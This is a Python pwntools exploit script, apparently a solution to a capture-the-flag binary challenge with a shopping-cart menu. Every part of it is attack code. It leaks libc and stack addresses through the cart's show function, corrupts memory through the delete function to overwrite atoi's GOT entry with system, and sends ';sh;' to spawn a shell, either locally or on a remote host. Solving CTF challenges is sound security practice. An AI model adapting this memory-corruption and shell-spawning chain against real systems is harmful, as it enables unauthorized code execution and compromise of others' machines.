#!/usr/bin/env python2

from pwn import *
from qpwn import *
from sys import argv
context(binary='./pwn', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote(argv[1], int(argv[2]))
    libc = ELF('./libc.so.6')
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
    libc = ELF('./libc.so.6')
else:
    p = process('./pwn')
    libc = ELF('./libc-2.23.so')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

def menu(index):
    p.sla('>', str(index))

def buy(index):
    menu(2)
    p.sla('Device Number>', str(index))

def delete(index, content=None):
    menu(3)
    if content:
        p.sa('Item Number>', content)
    else:
        p.sa('Item Number>', str(index))

def show(content=None):
    menu(4)
    if content:
        p.sa('ur cart. ok? (y/n) >', 'y\x00' + content)
    else:
        p.sa('ur cart. ok? (y/n) >', 'y')

def checkout():
    menu(5)
    p.sla('ur cart. ok? (y/n) >', 'y')

if __name__ == '__main__':
    for i in range(6):
        buy(1)
    for i in range(20):
        buy(2)
    checkout()
    #gogogo('x /20dx 0xffffdde8')
    #gogogo('b *0x08048AB9')
    show(flat(elf.got['puts'], 0xdeadbeef, 0x0, 0x0))
    p.ru('27: ')
    puts_addr = u32(p.r(4))
    libc.address = puts_addr - libc.sym['puts']
    success('libc ' + hex(libc.address))
    #gogogo()
    show(flat(libc.sym['__environ'], 0xdeadbeef, 0x0, 0x0))
    p.ru('27: ')
    stack_addr = u32(p.r(4)) - 0xffffdf0c + 0xffffde08
    success('stack ' + hex(stack_addr))
    #gogogo()
    #bc(0x08048C0B)
    delete(0x0, '27' + flat(libc.search('/bin/sh').next(), libc.sym['system'], elf.got['atoi']+0x22, stack_addr-0x8))
    payload = flat(libc.sym['system'], ';sh;')
    p.sa('>', payload)
    #gogogo('x /20dx %s' % hex(stack_addr))
    #show()
    p.i()
